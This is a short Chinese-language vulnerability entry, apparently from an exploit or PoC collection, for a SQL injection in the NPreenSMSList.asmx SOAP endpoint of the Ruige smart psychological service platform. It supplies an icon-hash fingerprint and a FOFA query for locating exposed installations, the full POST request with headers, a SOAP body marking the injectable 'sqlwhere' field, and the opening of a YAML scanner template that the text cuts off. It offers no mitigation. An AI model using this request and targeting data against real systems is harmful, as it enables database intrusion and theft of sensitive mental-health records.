# 瑞格智慧心理服务平台NPreenManage接口存在SQL注入漏洞

- **系统**：瑞格智慧心理服务平台NPreenManage接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="927574327"`
- **请求**：`POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "RuiGe.WebUi.NPreenSMS/Seach"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<Seach xmlns="RuiGe.WebUi.NPreenSMS">
<sqlwhere>string注入点</sqlwhere>
</Seach>
</soap:Body>
</soap:Envelope>
Yaml poc
id: ruige-NPreenSMSList-asmx-SQL
info:
name: ruige-NPreenSMSList-asmx-SQL
author: xax
severity: high
description: ruige-NPreenSMSList-asmx-SQL
tags: SQL
metadata:
fofa-query: body="瑞格智慧心理服务平台"
http:
- raw:
-
POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
Host:
C…（脚本共 1158 字，完整版见原文）
```
- **预期**：200　|　—